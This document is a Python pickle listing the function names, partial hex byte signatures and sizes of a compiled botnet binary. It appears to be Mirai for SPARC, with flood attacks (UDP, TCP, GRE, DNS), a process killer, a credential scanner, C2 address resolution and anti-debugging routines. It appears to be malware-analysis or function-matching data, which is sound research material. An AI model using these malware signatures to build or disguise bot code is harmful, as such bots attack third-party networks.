(lp0
(S'_init'
p1
S'9de39840002800003500'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'9de3982300801900b9c44000800300'
p5
L124L
tp6
a(S'call___do_global_dtors_aux'
p7
S'9de3988100'
p8
L12L
tp9
a(S'frame_dummy'
p10
S'9de3980300'
p11
L96L
tp12
a(S'call_frame_dummy'
p13
S'9de3988100'
p14
L12L
tp15
a(S'_start'
p16
S'bc23589403591700401900122c12949813741001320000000534019400'
p17
L76L
tp18
a(S'attack_app_http'
p19
S'03'
p20
L8036L
tp21
a(S'attack_get_opt_str'
p22
S'908aff00c20402800c100080d602c2040884a0028086e0104000a1ff92100310'
p23
L96L
tp24
a(S'attack_get_opt_ip'
p25
S'9de398900e20921019ff96100080010040008f0000'
p26
L56L
tp27
a(S'attack_get_opt_int'
p28
S'9de398900e20921019ff96100080010040000a'
p29
L56L
tp30
a(S'attack_start'
p31
S'9de398400013000080803300001e0c00008080a20200802400b9c600e0801980c2002940008900001eb0100929c60d'
p32
L236L
tp33
a(S'attack_parse'
p34
S'9de390808780e8a66005ec0e204e200220a02c02c080a2101027a9b400b8a420040027bf080418040020100c0428140405c4e08086e083'
p35
L556L
tp36
a(S'attack_kill_all'
p37
S'9de39803000300d00080a200030404a4001240001401008100'
p38
L76L
tp39
a(S'add_attack'
p40
S'9de398901001271e9210082a04220000b9932ad0806a02d08022a002220122e0'
p41
L92L
tp42
a(S'attack_init'
p43
S'9de39890100000517fff921290100100527fff921290100200537f'
p44
L172L
tp45
a(S'attack_gre_eth'
p46
S'9de348900e204000dc10080092101bfe9610000092101b007ffe9614'
p47
L1384L
tp48
a(S'attack_gre_ip'
p49
S'9de350900e2040000410080092101bfd7410000092101b007ffd6d9614'
p50
L1284L
tp51
a(S'attack_tcp_stomp'
p52
S'9de32027a0b50e209010102492101010102492100410080092101bfc2c10002fbe1a1003003f7ffc25a41008101bfc1f961040d0be1a10059610012fbe1a10077ffc1337be1a100bfc0dd0be1a100c'
p53
L1808L
tp54
a(S'attack_tcp_ack'
p55
S'9de33827a0a340007b100410080092101bfa6d9610002fbf1a1003003f7ffa9614ff27bf1a1004'
p56
L1500L
tp57
a(S'attack_tcp_syn'
p58
S'9de3382fbfff21ae10080092101bf8f72fbf1a1003003f7ff8'
p59
L1488L
tp60
a(S'attack_udp_plain'
p61
S'9de380004000919210041008008d10080092101b007ff714'
p62
L520L
tp63
a(S'attack_udp_generic'
p64
S'9de36027a0ff1f922010080092101bf7a61008101b007ff69614ff101a1004fff4961040a41008101bf6961000101a10067ff69614ff0092101bf69614ff101a1000f6961000101a1001f69610012fbf1a101900b9d600a0100200033fff80d0bf0127bf00bfee981004a200b800c4e8bfd6eaec831080b20010ff00c0f4a003ff10003cff2c1810a810012700c2f48302070088e0c20010'
p65
L1048L
tp66
a(S'attack_udp_vse'
p67
S'9de388000a10080092101bf5fc961000101a1003003f7ff5f59614'
p68
L908L
tp69
a(S'attack_udp_dns'
p70
S'9de33027a097900e2040000410080092101bf517961000101a1003003f7ff51027b790101a1004ff0a1008101bf5041000101a10067ff4'
p71
L1588L
tp72
a(S'checksum_generic'
p73
S'800a20c2007f80fc90020280913001a03f'
p74
L104L
tp75
a(S'checksum_tcpudp'
p76
S'c42002108088208820c20002febf60028087a000003f'
p77
L192L
tp78
a(S'mem_exists'
p79
S'8010c3e090100048c0a000000180862080058120900201a2ffc400c3e00100'
p80
L96L
tp81
a(S'killer_kill'
p82
S'9de3980300400010'
p83
L28L
tp84
a(S'killer_kill_by_port'
p85
S'03ff'
p86
L1608L
tp87
a(S'killer_init'
p88
S'03ff'
p89
L1780L
tp90
a(S'anti_gdb_entry'
p91
S'03001005c3e0c2'
p92
L20L
tp93
a(S'teardown_connection'
p94
S'9de39803008006843fff0e68843fff00b94000aa901001'
p95
L60L
tp96
a(S'ensure_single_instance'
p97
S'9de380bf0200fd94100000b902201300921294100407bfe8e020901010000000100040000400b903c0a000100300'
p98
L356L
tp99
a(S'main'
p100
S'9de3b8d0400000cc90101000bb90100100db2000ca209010054000'
p101
L2128L
tp102
a(S'resolve_cnc_addr'
p103
S'9de398400090100300bb4000d60100a4100808901003800100400016e2a0b94000790c0004082404009a08901004100400a3c200340208901004'
p104
L144L
tp105
a(S'rand_next'
p106
S'0900830b00b9c2ac0900c2b000b9c2b430081886c01a0323'
p107
L80L
tp108
a(S'rand_str'
p109
S'9de3988017800780e6067fd00010208001007f'
p110
L108L
tp111
a(S'rand_alphastr'
p112
S'9de37007bf76124000fd94102180a2a6600380a0'
p113
L168L
tp114
a(S'rand_init'
p115
S'9de398400090100000b9d062100800b94000b000b9c2b01a0100b98100'
p116
L80L
tp117
a(S'resolv_skip_name'
p118
S''
p119
L128L
tp120
a(S'resolv_entries_free'
p121
S'9de398800a00000620a20000001401004000901018'
p122
L56L
tp123
a(S'resolv_domain_to_hostname'
p124
S'9de398400046901019201020800580078820c8'
p125
L116L
tp126
a(S'resolv_lookup'
p127
S'9de30020400092100807b8167f'
p128
L1084L
tp129
a(S'consume_any_prompt'
p130
S'8400c218a200020248601ca00080168014a000801690'
p131
L172L
tp132
a(S'can_consume'
p133
g119
L28L
tp134
a(S'scanner_kill'
p135
S'9de398030040001c1009'
p136
L28L
tp137
a(S'deobf'
p138
S'9de3984000e110184000129002010640000018400080842094100108222801bf80'
p139
L100L
tp140
a(S'add_auth_entry'
p141
S'9de3902300d2bcd0e89202a6100824e8a107bf18'
p142
L232L
tp143
a(S'setup_connection'
p144
S'9de38827bfecc0'
p145
L196L
tp146
a(S'recv_strip_null'
p147
S'9de398901018101a11800b204880a000'
p148
L80L
tp149
a(S'scanner_init'
p150
S'9de38808030014055c80ee010040008c000000b9d06340001f90100000b99010808800b9c0f4842088009a548305'
p151
L6112L
tp152
a(S'table_retrieve_val'
p153
S'912a0300b9800402011204228100'
p154
L40L
tp155
a(S'toggle_obf'
p156
S'900aff00b990020100b9961001308960181204a0008620c400c20228020200080228020200080228020200080228021204a0'
p157
L152L
tp158
a(S'table_lock_val'
p159
S'9de3987f'
p160
L20L
tp161
a(S'table_unlock_val'
p162
S'9de3987fff900e208100'
p163
L20L
tp164
a(S'add_entry'
p165
S'9de398400090101a101901101a00b9b120e0401820'
p166
L64L
tp167
a(S'table_init'
p168
S'9de3989010030076127f'
p169
L1012L
tp170
a(S'util_strlen'
p171
S'8400c2008090100002014a0080'
p172
L52L
tp173
a(S'util_strncmp'
p174
S'9de3987fff901018'
p175
L104L
tp176
a(S'util_strcmp'
p177
S'9de3987f'
p178
L96L
tp179
a(S'util_memcpy'
p180
S'8008802801bf80c3e00100'
p181
L44L
tp182
a(S'util_strcpy'
p183
S'9de3987fffa01018'
p184
L40L
tp185
a(S'util_zero'
p186
S'8007'
p187
L40L
tp188
a(S'util_itoa'
p189
S'9de37010188092101980'
p190
L240L
tp191
a(S'util_memsearch'
p192
S'8015801210004a0048c0a000862086e080058100900201bf00c3e09010'
p193
L96L
tp194
a(S'util_stristr'
p195
S'9de398a0'
p196
L144L
tp197
a(S'util_atoi'
p198
S'9de398c400e00080b0208080c4001000b0e02300102083188003'
p199
L420L
tp200
a(S'util_fdgets'
p201
S'9de398a4101810181018011001808001808000bf208000'
p202
L96L
tp203
a(S'util_local_addr'
p204
S'9de3800227bf00100209941000a200100037bf0227bf35a010100890101100a807bf79101107bf'
p205
L132L
tp206
a(S'fork'
p207
g119
L52L
tp208
a(S'.urem'
p209
S'81000100947209e09022'
p210
L32L
tp211
a(S'.udiv'
p212
S'81008100'
p213
L20L
tp214
a(S'.umul'
p215
S'9052008100'
p216
L12L
tp217
a(S'.rem'
p218
S'953a1f8100010094fa0080943a0922'
p219
L44L
tp220
a(S'fcntl'
p221
S'9de390'
p222
L136L
tp223
a(S'fcntl64'
p224
S'9de390'
p225
L100L
tp226
a(S'chdir'
p227
S'9de398'
p228
L68L
tp229
a(S'close'
p230
S'9de398'
p231
L68L
tp232
a(S'getpid'
p233
S'9de398'
p234
L64L
tp235
a(S'getppid'
p236
S'9de398'
p237
L64L
tp238
a(S'ioctl'
p239
S'9de390'
p240
L100L
tp241
a(S'kill'
p242
S'9de398'
p243
L72L
tp244
a(S'open'
p245
S'9de39094100027a054fa27a0198e02a05094101a27bf10321080ba2008a000b000b03fff2200'
p246
L120L
tp247
a(S'creat'
p248
S'9410091300bf00'
p249
L20L
tp250
a(S'prctl'
p251
S'9de398'
p252
L84L
tp253
a(S'read'
p254
S'9de398'
p255
L76L
tp256
a(S'readlink'
p257
S'9de398'
p258
L76L
tp259
a(S'select'
p260
S'9de398'
p261
L84L
tp262
a(S'setsid'
p263
S'9de398'
p264
L64L
tp265
a(S'sigprocmask'
p266
S'9de398901018a660008094101aa00010808096100800b03fff2200e820100880b400b400'
p267
L140L
tp268
a(S'time'
p269
S'9de398'
p270
L72L
tp271
a(S'unlink'
p272
S'9de398'
p273
L68L
tp274
a(S'write'
p275
S'9de398'
p276
L76L
tp277
a(S'closedir'
p278
S'9de388007207bf18060092129010118094101000'
p279
L136L
tp280
a(S'opendir'
p281
S'9de34013001018'
p282
L260L
tp283
a(S'readdir'
p284
S'9de3880620130010100a1240003006200620800ec60c0600d220002d8004201020c00406200620000820040420c203bf2007bf010ab0008100'
p285
L168L
tp286
a(S'__errno_location'
p287
S'11009012'
p288
L12L
tp289
a(S'clock'
p290
S'9de3880b9007bfecc4bfff230300'
p291
L56L
tp292
a(S'bcopy'
p293
S'96100810'
p294
L12L
tp295
a(S'memmove'
p296
S'80400800960280768b03020a8080eb8a12600480'
p297
L1448L
tp298
a(S'memcpy'
p299
S'9822092303808008bf600480'
p300
L4196L
tp301
a(S'sub_1BA30'
p302
S'81'
p303
L8L
tp304
a(S'sub_1BA38'
p305
S'81'
p306
L8L
tp307
a(S'bzero'
p308
S'1000'
p309
L8L
tp310
a(S'memset'
p311
S'8660ff10021002a2001008'
p312
L192L
tp313
a(S'sub_1BB34'
p314
S'81'
p315
L8L
tp316
a(S'inet_addr'
p317
S'9de390901018002ba200'
p318
L40L
tp319
a(S'accept'
p320
S'9de398'
p321
L76L
tp322
a(S'bind'
p323
S'9de38827bf'
p324
L36L
tp325
a(S'connect'
p326
S'9de398'
p327
L76L
tp328
a(S'getsockname'
p329
S'9de398'
p330
L76L
tp331
a(S'getsockopt'
p332
S'9de398'
p333
L84L
tp334
a(S'listen'
p335
S'9de3909010043fbf459207bf'
p336
L28L
tp337
a(S'recv'
p338
S'9de3883fbf'
p339
L32L
tp340
a(S'recvfrom'
p341
S'9de398'
p342
L88L
tp343
a(S'send'
p344
S'9de3883fbf'
p345
L32L
tp346
a(S'sendto'
p347
S'9de398'
p348
L88L
tp349
a(S'setsockopt'
p350
S'9de380bfe8f6bff44000'
p351
L44L
tp352
a(S'socket'
p353
S'9de398'
p354
L76L
tp355
a(S'raise'
p356
S'9de3987ff71018bf00'
p357
L20L
tp358
a(S'sigaddset'
p359
S'9de398'
p360
L56L
tp361
a(S'sigemptyset'
p362
S'9de3989210001080be8100'
p363
L32L
tp364
a(S'signal'
p365
S'9de380008004a6208027bfecb03fff2200e82010bf032084'
p366
L188L
tp367
a(S'__sigismember'
p368
S'9202'
p369
L40L
tp370
a(S'__sigaddset'
p371
S'86009202842090100032932ac209c3e0c2'
p372
L44L
tp373
a(S'__sigdelset'
p374
S'86009202842090100032932ac209e0c4'
p375
L44L
tp376
a(S'malloc'
p377
S'9de3908004a63ff810201800'
p378
L320L
tp379
a(S'calloc'
p380
S'9de398a0a620020081000100'
p381
L112L
tp382
a(S'free'
p383
S'9de39880a0063ffc310090162292101000901500c218a4c080a000ba9014840490100080c4040029162210008005c208200880c20480c20425009012f490241300bab0212212bfe0'
p384
L232L
tp385
a(S'realloc'
p386
S'9de3988006a21018ffb0203020126007b0001000a404fcb07f800304fcb020a600082000b99014f492041900901210019014f480'
p387
L280L
tp388
a(S'__heap_alloc'
p389
S'c20008800200801a0004000180'
p390
L160L
tp391
a(S'__heap_alloc_at'
p392
S'8800940220020000801b000980940a0a80'
p393
L156L
tp394
a(S'__heap_link_free_area'
p395
S'd4600880d62210a00080d2e08100'
p396
L48L
tp397
a(S'__heap_link_free_area_after'
p398
S'80032200220822'
p399
L24L
tp400
a(S'__heap_free'
p401
S'9de398882090101880'
p402
L268L
tp403
a(S'atol'
p404
S'921000c0800100'
p405
L20L
tp406
a(S'strtol'
p407
S'961001800100'
p408
L16L
tp409
a(S'_stdlib_strto_l'
p410
S'9de3980300c640c4'
p411
L428L
tp412
a(S'exit'
p413
S'9de38800b994142007bfa810110000b980059fc01018009c9210010000000000a00000008d40006b00'
p414
L128L
tp415
a(S'sleep'
p416
S'9de3002012bf0800c07880830227bff4a01014'
p417
L428L
tp418
a(S'__uClibc_fini'
p419
S'9de3980500b9'
p420
L132L
tp421
a(S'__pthread_return_0'
p422
S'8120'
p423
L8L
tp424
a(S'_pthread_cleanup_push_defer'
p425
S'8100'
p426
L8L
tp427
a(S'__check_one_fd'
p428
S'9de398921001dba2009210190078ff7d12c81880010040009d01008100'
p429
L68L
tp430
a(S'__uClibc_init'
p431
S'9de39805000080'
p432
L104L
tp433
a(S'__uClibc_main'
p434
S'9de32000b9c4630300830200b984e0c4140680a000'
p435
L620L
tp436
a(S'__socketcall'
p437
S'9de398'
p438
L72L
tp439
a(S'_exit'
p440
S'9de398'
p441
L64L
tp442
a(S'fstat'
p443
S'9de358'
p444
L104L
tp445
a(S'__getdents'
p446
S'9de3989010180092101980b44018e86008066004400006600c066013600406600b0e6012600af4fb940219fff7166008166008a6401abf6010'
p447
L136L
tp448
a(S'__getdents64'
p449
S'9de398'
p450
L288L
tp451
a(S'getegid'
p452
S'9de398'
p453
L64L
tp454
a(S'geteuid'
p455
S'9de398'
p456
L64L
tp457
a(S'getgid'
p458
S'9de398'
p459
L64L
tp460
a(S'getuid'
p461
S'9de398'
p462
L64L
tp463
a(S'lseek64'
p464
S'9de390'
p465
L112L
tp466
a(S'nanosleep'
p467
S'9de398'
p468
L72L
tp469
a(S'sbrk'
p470
S'9de39821008007a20020a200b03fff80'
p471
L84L
tp472
a(S'times'
p473
S'9de398'
p474
L72L
tp475
a(S'__xstat64_conv'
p476
S'9de398921000'
p477
L140L
tp478
a(S'__xstat_conv'
p479
S'9de398921000'
p480
L156L
tp481
a(S'inet_aton'
p482
S'80008015c3e09010004a00'
p483
L220L
tp484
a(S'sigaction'
p485
S'9de38000c20027bf800106608827bf8427bf18a6a003be78000080b000800b07be048007bee9c2e4a0e88100'
p486
L160L
tp487
a(S'abort'
p488
S'9de38800b9901244842010bf032084'
p489
L316L
tp490
a(S'_dl_aux_init'
p491
S'c42000ba03008161'
p492
L28L
tp493
a(S'brk'
p494
S'9de398'
p495
L60L
tp496
a(S'__syscall_rt_sigaction'
p497
S'9de398'
p498
L80L
tp499
a(S'__do_global_ctors_aux'
p500
S'9de3980300c47f8008c0c400bf008100'
p501
L60L
tp502
a(S'call___do_global_ctors_aux'
p503
S'9de3988100'
p504
L12L
tp505
a(S'_fini'
p506
S'9de3987fca0000'
p507
L20L
tp508
a.